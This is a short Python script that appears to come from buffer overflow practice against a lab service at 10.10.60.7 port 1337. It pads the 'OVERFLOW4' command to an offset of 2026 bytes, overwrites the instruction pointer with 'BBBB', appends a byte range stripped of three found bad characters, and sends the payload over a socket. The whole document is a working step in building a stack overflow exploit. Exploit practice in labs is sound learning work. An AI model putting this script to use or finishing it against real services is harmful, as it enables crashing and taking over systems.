import socket, struct
host, port ='10.10.60.7', 1337
command = b'OVERFLOW4 '
length = 2988
offset = 2026
new_eip = b'BBBB'
all_chars = bytearray(range(1,256))
bad_chars = [
b'\xa9',
b'\xcd',
b'\xd4'
]
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

payload = b''.join([command,
b'A' * offset,
new_eip,
all_chars,
b'C' * (length - offset - len(new_eip) - len(all_chars)),


])
with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)

